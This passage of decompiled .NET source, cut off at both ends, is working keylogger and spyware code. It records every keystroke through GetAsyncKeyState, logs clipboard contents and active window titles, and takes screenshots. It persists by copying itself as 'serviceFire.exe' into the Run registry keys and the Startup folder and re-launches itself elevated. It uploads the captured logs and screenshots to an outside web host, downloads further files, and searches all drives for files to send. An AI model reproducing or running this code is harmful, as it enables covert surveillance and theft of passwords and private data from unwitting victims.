								goto IL_09d5;
							case 243:
								num = 243;
								charCount++;
								goto IL_0aa3;
							case 254:
								num = 254;
								charCount++;
								goto IL_0b22;
							case 260:
								num = 260;
								charCount++;
								goto IL_0b71;
							case 271:
								num = 271;
								charCount++;
								goto IL_0bef;
							case 282:
								num = 282;
								charCount++;
								goto IL_0c71;
							case 293:
								num = 293;
								charCount++;
								goto IL_0cf5;
							case 304:
								num = 304;
								charCount++;
								goto IL_0d77;
							case 315:
								num = 315;
								charCount++;
								goto IL_0df9;
							case 337:
								num = 337;
								charCount++;
								goto IL_0e3a;
							case 382:
								num = 382;
								charCount++;
								goto IL_0f6a;
							default:
								goto end_IL_0001;
							case 386:
							case 395:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_1146:
						num = 394;
						Application.DoEvents();
						goto end_IL_0001_3;
						IL_1129:
						num = 392;
						((TextBoxBase)TextBox1).AppendText(Conversions.ToString(addKey));
						goto IL_1146;
						IL_0009:
						num = 2;
						keyPressed = GetAsyncKeyState(13);
						goto IL_001e;
						IL_001e:
						num = 3;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0039;
						}
						goto IL_0056;
						IL_0039:
						num = 4;
						charCount = 0;
						goto IL_0043;
						IL_0043:
						num = 5;
						addKey = "\r\n";
						goto IL_10d3;
						IL_0056:
						num = 8;
						keyPressed = GetAsyncKeyState(8);
						goto IL_006a;
						IL_006a:
						num = 9;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0086;
						}
						goto IL_00ac;
						IL_0086:
						num = 10;
						addKey = "[bs]";
						goto IL_0095;
						IL_0095:
						num = 11;
						charCount += 4;
						goto IL_10d3;
						IL_00ac:
						num = 14;
						keyPressed = GetAsyncKeyState(32);
						goto IL_00c2;
						IL_00c2:
						num = 15;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_00de;
						}
						goto IL_00f2;
						IL_00de:
						num = 16;
						addKey = " ";
						goto IL_10d3;
						IL_00f2:
						num = 20;
						keyPressed = GetAsyncKeyState(186);
						goto IL_010b;
						IL_010b:
						num = 21;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0127;
						}
						goto IL_0162;
						IL_0127:
						num = 22;
						if (!getShift())
						{
							goto IL_0136;
						}
						goto IL_014a;
						IL_0136:
						num = 23;
						addKey = ";";
						goto IL_10d3;
						IL_014a:
						num = 25;
						goto IL_014e;
						IL_014e:
						num = 26;
						addKey = ":";
						goto IL_10d3;
						IL_0162:
						num = 31;
						keyPressed = GetAsyncKeyState(187);
						goto IL_017b;
						IL_017b:
						num = 32;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0197;
						}
						goto IL_01d2;
						IL_0197:
						num = 33;
						if (!getShift())
						{
							goto IL_01a6;
						}
						goto IL_01ba;
						IL_01a6:
						num = 34;
						addKey = "=";
						goto IL_10d3;
						IL_01ba:
						num = 36;
						goto IL_01be;
						IL_01be:
						num = 37;
						addKey = "+";
						goto IL_10d3;
						IL_01d2:
						num = 42;
						keyPressed = GetAsyncKeyState(188);
						goto IL_01eb;
						IL_01eb:
						num = 43;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0207;
						}
						goto IL_0242;
						IL_0207:
						num = 44;
						if (!getShift())
						{
							goto IL_0216;
						}
						goto IL_022a;
						IL_0216:
						num = 45;
						addKey = ",";
						goto IL_10d3;
						IL_022a:
						num = 47;
						goto IL_022e;
						IL_022e:
						num = 48;
						addKey = "<";
						goto IL_10d3;
						IL_0242:
						num = 53;
						keyPressed = GetAsyncKeyState(189);
						goto IL_025b;
						IL_025b:
						num = 54;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0277;
						}
						goto IL_02b2;
						IL_0277:
						num = 55;
						if (!getShift())
						{
							goto IL_0286;
						}
						goto IL_029a;
						IL_0286:
						num = 56;
						addKey = "-";
						goto IL_10d3;
						IL_029a:
						num = 58;
						goto IL_029e;
						IL_029e:
						num = 59;
						addKey = "_";
						goto IL_10d3;
						IL_02b2:
						num = 64;
						keyPressed = GetAsyncKeyState(190);
						goto IL_02cb;
						IL_02cb:
						num = 65;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_02e7;
						}
						goto IL_0322;
						IL_02e7:
						num = 66;
						if (!getShift())
						{
							goto IL_02f6;
						}
						goto IL_030a;
						IL_02f6:
						num = 67;
						addKey = ".";
						goto IL_10d3;
						IL_030a:
						num = 69;
						goto IL_030e;
						IL_030e:
						num = 70;
						addKey = ">";
						goto IL_10d3;
						IL_0322:
						num = 75;
						keyPressed = GetAsyncKeyState(191);
						goto IL_033b;
						IL_033b:
						num = 76;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0357;
						}
						goto IL_0392;
						IL_0357:
						num = 77;
						if (!getShift())
						{
							goto IL_0366;
						}
						goto IL_037a;
						IL_0366:
						num = 78;
						addKey = "/";
						goto IL_10d3;
						IL_037a:
						num = 80;
						goto IL_037e;
						IL_037e:
						num = 81;
						addKey = "?";
						goto IL_10d3;
						IL_0392:
						num = 86;
						keyPressed = GetAsyncKeyState(192);
						goto IL_03ab;
						IL_03ab:
						num = 87;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_03c7;
						}
						goto IL_0402;
						IL_03c7:
						num = 88;
						if (!getShift())
						{
							goto IL_03d6;
						}
						goto IL_03ea;
						IL_03d6:
						num = 89;
						addKey = "`";
						goto IL_10d3;
						IL_03ea:
						num = 91;
						goto IL_03ee;
						IL_03ee:
						num = 92;
						addKey = "~";
						goto IL_10d3;
						IL_0402:
						num = 97;
						keyPressed = GetAsyncKeyState(96);
						goto IL_0418;
						IL_0418:
						num = 98;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0434;
						}
						goto IL_046f;
						IL_0434:
						num = 99;
						if (!getShift())
						{
							goto IL_0443;
						}
						goto IL_0457;
						IL_0443:
						num = 100;
						addKey = "0";
						goto IL_10d3;
						IL_0457:
						num = 102;
						goto IL_045b;
						IL_045b:
						num = 103;
						addKey = ")";
						goto IL_10d3;
						IL_046f:
						num = 108;
						keyPressed = GetAsyncKeyState(97);
						goto IL_0485;
						IL_0485:
						num = 109;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_04a1;
						}
						goto IL_04dc;
						IL_04a1:
						num = 110;
						if (!getShift())
						{
							goto IL_04b0;
						}
						goto IL_04c4;
						IL_04b0:
						num = 111;
						addKey = "1";
						goto IL_10d3;
						IL_04c4:
						num = 113;
						goto IL_04c8;
						IL_04c8:
						num = 114;
						addKey = "!";
						goto IL_10d3;
						IL_04dc:
						num = 119;
						keyPressed = GetAsyncKeyState(98);
						goto IL_04f2;
						IL_04f2:
						num = 120;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_050e;
						}
						goto IL_0549;
						IL_050e:
						num = 121;
						if (!getShift())
						{
							goto IL_051d;
						}
						goto IL_0531;
						IL_051d:
						num = 122;
						addKey = "2";
						goto IL_10d3;
						IL_0531:
						num = 124;
						goto IL_0535;
						IL_0535:
						num = 125;
						addKey = "@";
						goto IL_10d3;
						IL_0549:
						num = 130;
						keyPressed = GetAsyncKeyState(99);
						goto IL_0562;
						IL_0562:
						num = 131;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0581;
						}
						goto IL_05c8;
						IL_0581:
						num = 132;
						if (!getShift())
						{
							goto IL_0593;
						}
						goto IL_05aa;
						IL_0593:
						num = 133;
						addKey = "3";
						goto IL_10d3;
						IL_05aa:
						num = 135;
						goto IL_05b1;
						IL_05b1:
						num = 136;
						addKey = "#";
						goto IL_10d3;
						IL_05c8:
						num = 141;
						keyPressed = GetAsyncKeyState(100);
						goto IL_05e1;
						IL_05e1:
						num = 142;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0600;
						}
						goto IL_0647;
						IL_0600:
						num = 143;
						if (!getShift())
						{
							goto IL_0612;
						}
						goto IL_0629;
						IL_0612:
						num = 144;
						addKey = "4";
						goto IL_10d3;
						IL_0629:
						num = 146;
						goto IL_0630;
						IL_0630:
						num = 147;
						addKey = "$";
						goto IL_10d3;
						IL_0647:
						num = 152;
						keyPressed = GetAsyncKeyState(101);
						goto IL_0660;
						IL_0660:
						num = 153;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_067f;
						}
						goto IL_06c6;
						IL_067f:
						num = 154;
						if (!getShift())
						{
							goto IL_0691;
						}
						goto IL_06a8;
						IL_0691:
						num = 155;
						addKey = "5";
						goto IL_10d3;
						IL_06a8:
						num = 157;
						goto IL_06af;
						IL_06af:
						num = 158;
						addKey = "%";
						goto IL_10d3;
						IL_06c6:
						num = 163;
						keyPressed = GetAsyncKeyState(102);
						goto IL_06df;
						IL_06df:
						num = 164;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_06fe;
						}
						goto IL_0745;
						IL_06fe:
						num = 165;
						if (!getShift())
						{
							goto IL_0710;
						}
						goto IL_0727;
						IL_0710:
						num = 166;
						addKey = "6";
						goto IL_10d3;
						IL_0727:
						num = 168;
						goto IL_072e;
						IL_072e:
						num = 169;
						addKey = "7";
						goto IL_10d3;
						IL_0745:
						num = 174;
						keyPressed = GetAsyncKeyState(103);
						goto IL_075e;
						IL_075e:
						num = 175;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_077d;
						}
						goto IL_07c4;
						IL_077d:
						num = 176;
						if (!getShift())
						{
							goto IL_078f;
						}
						goto IL_07a6;
						IL_078f:
						num = 177;
						addKey = "7";
						goto IL_10d3;
						IL_07a6:
						num = 179;
						goto IL_07ad;
						IL_07ad:
						num = 180;
						addKey = "&";
						goto IL_10d3;
						IL_07c4:
						num = 185;
						keyPressed = GetAsyncKeyState(104);
						goto IL_07dd;
						IL_07dd:
						num = 186;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_07fc;
						}
						goto IL_0843;
						IL_07fc:
						num = 187;
						if (!getShift())
						{
							goto IL_080e;
						}
						goto IL_0825;
						IL_080e:
						num = 188;
						addKey = "8";
						goto IL_10d3;
						IL_0825:
						num = 190;
						goto IL_082c;
						IL_082c:
						num = 191;
						addKey = "*";
						goto IL_10d3;
						IL_0843:
						num = 196;
						keyPressed = GetAsyncKeyState(105);
						goto IL_085c;
						IL_085c:
						num = 197;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_087b;
						}
						goto IL_08c2;
						IL_087b:
						num = 198;
						if (!getShift())
						{
							goto IL_088d;
						}
						goto IL_08a4;
						IL_088d:
						num = 199;
						addKey = "9";
						goto IL_10d3;
						IL_08a4:
						num = 201;
						goto IL_08ab;
						IL_08ab:
						num = 202;
						addKey = "(";
						goto IL_10d3;
						IL_08c2:
						num = 207;
						keyPressed = GetAsyncKeyState(106);
						goto IL_08db;
						IL_08db:
						num = 208;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_08fa;
						}
						goto IL_0956;
						IL_08fa:
						num = 209;
						if (!getShift())
						{
							goto IL_090c;
						}
						goto IL_0938;
						IL_090c:
						num = 210;
						addKey = "*";
						goto IL_091e;
						IL_091e:
						num = 211;
						charCount++;
						goto IL_10d3;
						IL_0938:
						num = 213;
						goto IL_093f;
						IL_093f:
						num = 214;
						addKey = "";
						goto IL_10d3;
						IL_0956:
						num = 218;
						keyPressed = GetAsyncKeyState(107);
						goto IL_096f;
						IL_096f:
						num = 219;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_098e;
						}
						goto IL_09d5;
						IL_098e:
						num = 220;
						if (!getShift())
						{
							goto IL_09a0;
						}
						goto IL_09b7;
						IL_09a0:
						num = 221;
						addKey = "+";
						goto IL_10d3;
						IL_09b7:
						num = 223;
						goto IL_09be;
						IL_09be:
						num = 224;
						addKey = "=";
						goto IL_10d3;
						IL_09d5:
						num = 229;
						keyPressed = GetAsyncKeyState(108);
						goto IL_09ee;
						IL_09ee:
						num = 230;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0a0d;
						}
						goto IL_0a24;
						IL_0a0d:
						num = 231;
						addKey = "";
						goto IL_10d3;
						IL_0a24:
						num = 234;
						keyPressed = GetAsyncKeyState(109);
						goto IL_0a3d;
						IL_0a3d:
						num = 235;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0a5c;
						}
						goto IL_0aa3;
						IL_0a5c:
						num = 236;
						if (!getShift())
						{
							goto IL_0a6e;
						}
						goto IL_0a85;
						IL_0a6e:
						num = 237;
						addKey = "-";
						goto IL_10d3;
						IL_0a85:
						num = 239;
						goto IL_0a8c;
						IL_0a8c:
						num = 240;
						addKey = "_";
						goto IL_10d3;
						IL_0aa3:
						num = 245;
						keyPressed = GetAsyncKeyState(110);
						goto IL_0abc;
						IL_0abc:
						num = 246;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0adb;
						}
						goto IL_0b22;
						IL_0adb:
						num = 247;
						if (!getShift())
						{
							goto IL_0aed;
						}
						goto IL_0b04;
						IL_0aed:
						num = 248;
						addKey = ".";
						goto IL_10d3;
						IL_0b04:
						num = 250;
						goto IL_0b0b;
						IL_0b0b:
						num = 251;
						addKey = ">";
						goto IL_10d3;
						IL_0b22:
						num = 256;
						keyPressed = GetAsyncKeyState(111);
						goto IL_0b3b;
						IL_0b3b:
						num = 257;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0b5a;
						}
						goto IL_0b71;
						IL_0b5a:
						num = 258;
						addKey = "/";
						goto IL_10d3;
						IL_0b71:
						num = 262;
						keyPressed = GetAsyncKeyState(2);
						goto IL_0b89;
						IL_0b89:
						num = 263;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0ba8;
						}
						goto IL_0bef;
						IL_0ba8:
						num = 264;
						if (!getShift())
						{
							goto IL_0bba;
						}
						goto IL_0bd1;
						IL_0bba:
						num = 265;
						addKey = "/";
						goto IL_10d3;
						IL_0bd1:
						num = 267;
						goto IL_0bd8;
						IL_0bd8:
						num = 268;
						addKey = "?";
						goto IL_10d3;
						IL_0bef:
						num = 273;
						keyPressed = GetAsyncKeyState(220);
						goto IL_0c0b;
						IL_0c0b:
						num = 274;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0c2a;
						}
						goto IL_0c71;
						IL_0c2a:
						num = 275;
						if (!getShift())
						{
							goto IL_0c3c;
						}
						goto IL_0c53;
						IL_0c3c:
						num = 276;
						addKey = "\\";
						goto IL_10d3;
						IL_0c53:
						num = 278;
						goto IL_0c5a;
						IL_0c5a:
						num = 279;
						addKey = "|";
						goto IL_10d3;
						IL_0c71:
						num = 284;
						keyPressed = GetAsyncKeyState(222);
						goto IL_0c8d;
						IL_0c8d:
						num = 285;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0cac;
						}
						goto IL_0cf5;
						IL_0cac:
						num = 286;
						if (!getShift())
						{
							goto IL_0cbe;
						}
						goto IL_0cd5;
						IL_0cbe:
						num = 287;
						addKey = "'";
						goto IL_10d3;
						IL_0cd5:
						num = 289;
						goto IL_0cdc;
						IL_0cdc:
						num = 290;
						addKey = '"';
						goto IL_10d3;
						IL_0cf5:
						num = 295;
						keyPressed = GetAsyncKeyState(221);
						goto IL_0d11;
						IL_0d11:
						num = 296;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0d30;
						}
						goto IL_0d77;
						IL_0d30:
						num = 297;
						if (!getShift())
						{
							goto IL_0d42;
						}
						goto IL_0d59;
						IL_0d42:
						num = 298;
						addKey = "]";
						goto IL_10d3;
						IL_0d59:
						num = 300;
						goto IL_0d60;
						IL_0d60:
						num = 301;
						addKey = "}";
						goto IL_10d3;
						IL_0d77:
						num = 306;
						keyPressed = GetAsyncKeyState(219);
						goto IL_0d93;
						IL_0d93:
						num = 307;
						if (Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0db2;
						}
						goto IL_0df9;
						IL_0db2:
						num = 308;
						if (!getShift())
						{
							goto IL_0dc4;
						}
						goto IL_0ddb;
						IL_0dc4:
						num = 309;
						addKey = "[";
						goto IL_10d3;
						IL_0ddb:
						num = 311;
						goto IL_0de2;
						IL_0de2:
						num = 312;
						addKey = "{";
						goto IL_10d3;
						IL_0df9:
						num = 317;
						num5 = 65;
						goto IL_0e03;
						IL_0e03:
						num = 318;
						keyPressed = GetAsyncKeyState(num5);
						goto IL_0e1b;
						IL_0e1b:
						num = 319;
						if (!Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0e3a;
						}
						goto IL_0e59;
						IL_0e3a:
						num = 339;
						num5++;
						num6 = num5;
						num7 = 128;
						if (num6 <= 128)
						{
							goto IL_0e03;
						}
						goto IL_0f29;
						IL_0f29:
						num = 340;
						num8 = 48;
						goto IL_0f33;
						IL_0f33:
						num = 341;
						keyPressed = GetAsyncKeyState(num8);
						goto IL_0f4b;
						IL_0f4b:
						num = 342;
						if (!Operators.ConditionalCompareObjectEqual(keyPressed, (object)(-32767), false))
						{
							goto IL_0f6a;
						}
						goto IL_0f83;
						IL_0f6a:
						num = 384;
						num8++;
						num9 = num8;
						num7 = 57;
						if (num9 > 57)
						{
							break;
						}
						goto IL_0f33;
						IL_0f83:
						num = 343;
						if (getShift())
						{
							goto IL_0f95;
						}
						goto IL_10b4;
						IL_0f95:
						num = 344;
						switch (Conversion.Val(Strings.Chr(num8)))
						{
						case 0:
							break;
						case 1:
							goto IL_0ff4;
						case 2:
							goto IL_100b;
						case 3:
							goto IL_1022;
						case 4:
							goto IL_1039;
						case 5:
							goto IL_1050;
						case 6:
							goto IL_1064;
						case 7:
							goto IL_1078;
						case 8:
							goto IL_108c;
						case 9:
							goto IL_10a0;
						default:
							goto IL_10d3;
						}
						goto IL_0fdd;
						IL_10a0:
						num = 372;
						addKey = "(";
						goto IL_10d3;
						IL_108c:
						num = 369;
						addKey = "*";
						goto IL_10d3;
						IL_1078:
						num = 366;
						addKey = "&";
						goto IL_10d3;
						IL_1064:
						num = 363;
						addKey = "^";
						goto IL_10d3;
						IL_1050:
						num = 360;
						addKey = "%";
						goto IL_10d3;
						IL_1039:
						num = 357;
						addKey = "$";
						goto IL_10d3;
						IL_1022:
						num = 354;
						addKey = "#";
						goto IL_10d3;
						IL_100b:
						num = 351;
						addKey = "@";
						goto IL_10d3;
						IL_0ff4:
						num = 348;
						addKey = "!";
						goto IL_10d3;
						IL_0fdd:
						num = 375;
						addKey = ")";
						goto IL_10d3;
						IL_10b4:
						num = 378;
						goto IL_10bb;
						IL_10bb:
						num = 379;
						addKey = Strings.Chr(num8);
						goto IL_10d3;
						IL_0e59:
						num = 320;
						if (!getShift())
						{
							goto IL_0e6b;
						}
						goto IL_0ec5;
						IL_0e6b:
						num = 321;
						if (getCapslock())
						{
							goto IL_0e7a;
						}
						goto IL_0e9c;
						IL_0e7a:
						num = 322;
						addKey = Strings.UCase(Strings.Chr(num5));
						goto IL_10d3;
						IL_0e9c:
						num = 324;
						goto IL_0ea3;
						IL_0ea3:
						num = 325;
						addKey = Strings.LCase(Strings.Chr(num5));
						goto IL_10d3;
						IL_0ec5:
						num = 328;
						goto IL_0ecc;
						IL_0ecc:
						num = 329;
						if (!getCapslock())
						{
							goto IL_0ede;
						}
						goto IL_0f00;
						IL_0ede:
						num = 330;
						addKey = Strings.UCase(Strings.Chr(num5));
						goto IL_10d3;
						IL_0f00:
						num = 332;
						goto IL_0f07;
						IL_0f07:
						num = 333;
						addKey = Strings.LCase(Strings.Chr(num5));
						goto IL_10d3;
						IL_10d3:
						num = 387;
						if (charCount > lineLimit)
						{
							goto IL_10ea;
						}
						goto IL_110f;
						IL_10ea:
						num = 388;
						charCount = 0;
						goto IL_10f8;
						IL_10f8:
						num = 389;
						((TextBoxBase)TextBox1).AppendText("\r\n");
						goto IL_110f;
						IL_110f:
						num = 391;
						if (Operators.ConditionalCompareObjectNotEqual(addKey, (object)"", false))
						{
							goto IL_1129;
						}
						goto IL_1146;
						end_IL_0001_2:
						break;
					}
					num = 385;
					Application.DoEvents();
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 6778;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void evaluate()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = Application.get_ExecutablePath();
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void cpstartup()
	{
		if (Environment.OSVersion.Version.Major >= 6)
		{
			try
			{
				if (!File.Exists(Conversions.ToString(Operators.AddObject(path7, (object)"serviceFire.exe"))))
				{
					File.Copy(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(path7, (object)"serviceFire.exe")));
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(path7, (object)"serviceFire.exe"));
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(path7, (object)"serviceFire.exe"));
					File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("UserProfile") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\xxx.exe");
					mksvcfile(Conversions.ToString(Operators.AddObject(path7, (object)"serviceFire.exe")));
				}
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			if (!File.Exists(Conversions.ToString(Operators.AddObject(pathXP, (object)"serviceFire.exe"))))
			{
				File.Copy(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(pathXP, (object)"serviceFire.exe")));
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"serviceFire.exe"));
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"serviceFire.exe"));
				mksvcfile(Conversions.ToString(Operators.AddObject(pathXP, (object)"serviceFire.exe")));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void upweb(string fileup)
	{
		try
		{
			if (File.Exists(fileup))
			{
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(fileup, "http://tajdini.net/confz/up.php");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "###upfl------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ListBox1.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					File.Delete(Conversions.ToString(objectValue));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ListBox1.get_Items().Clear();
			string[] files = Directory.GetFiles(pathscr, "*.png");
			foreach (string text in files)
			{
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(text, "http://tajdini.net/confz/up.php");
				ListBox1.get_Items().Add((object)text);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "###upng------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex4.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
	}

	private void checksize(object pchk)
	{
		if (File.Exists(Conversions.ToString(pchk)))
		{
			FileInfo fileInfo = new FileInfo(Conversions.ToString(pchk));
			if (fileInfo.Length > 99000L)
			{
				File.Delete(Conversions.ToString(pchk));
			}
		}
	}

	private void opensite(string wwaddr)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("InternetExplorer.Application", ""));
		NewLateBinding.LateSet(objectValue, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		object[] array = new object[1] { wwaddr };
		bool[] array2 = new bool[1] { true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Navigate", array, (string[])null, (Type[])null, array2, true);
		if (array2[0])
		{
			wwaddr = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
		}
	}

	private void sendmail_Tick(object sender, EventArgs e)
	{
		if (InternetConnection())
		{
			upweb(path1);
		}
	}

	private void winCaption_Tick(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectNotEqual(cp, (object)Clipboard.GetText().ToString(), false))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathcp, Clipboard.GetText().ToString() + "\r\n", true);
			cp = Clipboard.GetText().ToString();
		}
		IntPtr foregroundWindow = GetForegroundWindow();
		if (foregroundWindow == IntPtr.Zero)
		{
			return;
		}
		int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
		checked
		{
			string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
			GetWindowTextA(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
			int lpdwProcessID = 0;
			GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			if (lpdwProcessID == 0)
			{
				return;
			}
			Process processById = Process.GetProcessById(lpdwProcessID);
			if (processById != null)
			{
				lpdwProcessID.ToString();
				_ = processById.ProcessName;
				string mainWindowTitle = processById.MainWindowTitle;
				windowTextLengthA.ToString();
				if (Operators.ConditionalCompareObjectNotEqual((object)mainWindowTitle, lastprtit, false))
				{
					((TextBoxBase)TextBox1).AppendText("</p><h3>\r\n[ " + mainWindowTitle + " ]\r\n<h3><p style=\"color:#f26;\">");
				}
				lastprtit = mainWindowTitle;
			}
		}
	}

	public void prtscr()
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_WorkingArea().Width, ((Computer)MyProject.Computer).get_Screen().get_WorkingArea().Height, (PixelFormat)135174);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Point point = new Point(0, 0);
		Point point2 = new Point(0, 0);
		Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_WorkingArea().Width, ((Computer)MyProject.Computer).get_Screen().get_WorkingArea().Height);
		val2.CopyFromScreen(point, point2, size);
		((Image)val).Save(pathscr + DateTime.Now.DayOfYear + DateTime.Now.Ticks + ".png", ImageFormat.get_Png());
	}

	public void downloadfile(object fileaddress, object newname)
	{
		try
		{
			downloadsinglefile(Conversions.ToString(fileaddress), Conversions.ToString(newname));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "###------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
	}

	public void findandsend()
	{
		checked
		{
			if (Operators.CompareString(findlocation, "all", false) == 0)
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					if (filequery.Length <= 0)
					{
						continue;
					}
					string[] array2 = filequery.Split(new char[1] { ';' });
					int num = array2.Length - 1;
					int num2 = 0;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 > num4)
						{
							break;
						}
						try
						{
							allfile(driveInfo.Name, array2[num2]);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
